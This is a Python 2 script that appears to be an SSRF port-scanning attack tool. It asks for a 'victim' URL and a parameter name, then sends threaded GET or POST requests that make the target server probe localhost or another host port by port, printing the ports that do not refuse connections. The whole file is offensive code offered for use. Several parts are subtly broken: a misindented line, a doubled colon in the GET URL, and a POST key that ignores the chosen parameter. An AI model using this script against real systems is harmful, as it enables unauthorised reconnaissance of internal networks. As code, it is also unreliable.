#!/usr/bin/python 

import requests 
import threading

thread = {} #save thread





#POST
def sendPostRequest(threadid, start, end):
    for a in range(start, end):  
        data['url'] = url+str(a)
        try:
            thread[threadid] = requests.post(victim,data)
            if "Connection refused" not in thread[threadid].text:
                print """| port :  %s |"""%str(a)
        except:
            continue
        
        
#GET
def sendGetRequest(threadid, start, end):
    for a in range(start, end):
        tmp = victim
        tmp += str(a)
        try:
            thread[threadid] = requests.get(tmp)
            if "Connection refused" not in thread[threadid].text:
                print """| port :  %s |"""%str(a)
        except:
            continue
        
        
        

def POSTAttack(thr34d,numberOfPort):
    print "Scanning....................................[.]" 
    StoreThread = ['']*int(thr34d)  # use to store when  thread inited
    
    jump = int(numberOfPort)/int(thr34d)
    
    for i in range(len(StoreThread)):
        StoreThread[i] = threading.Thread(target=sendPostRequest, args=(str(i), i*jump, jump*(i+1)))
    
    for i in range(len(StoreThread)):
        StoreThread[i].start()
    
    
def GETAttack(thr34d,numberOfPort):
        print "Scanning....................................[.]" 
    StoreThread = ['']*int(thr34d)  # use to store when  thread inited
    
    jump = int(numberOfPort)/int(thr34d)
    
    for i in range(len(StoreThread)):
        StoreThread[i] = threading.Thread(target=sendGetRequest, args=(str(i), i*jump, jump*(i+1)))
    
    for i in range(len(StoreThread)):
        StoreThread[i].start()








#input 
action = raw_input("local Attack ?(y/n)")
method = raw_input("Attack with POST or GET?(post/get)")
victim = raw_input("Victim address: ")
thr34d = raw_input("How many thread? ")
PortAmount = raw_input("How many port do you want to scan? ")
name = raw_input("Parameter name: ")

#Setup Url 
if action == 'y':
    url = '127.0.0.1:'
elif action == 'n': 
    url = raw_input("Address or IP: ")
    url+=":"
else : 
    print "Invalid input"


#check thread
if thr34d <1: 
    print "Invalid input"
else:
    pass



#Setup medthod
if method == 'post':
    data = {name:''}
    POSTAttack(thr34d,PortAmount)
elif method == 'get':
    victim = victim+'?'+name+"="+url+':' # http://www.xyz.com?url=abc.com:xxx
    GETAttack(thr34d,PortAmount)
else:
    pass





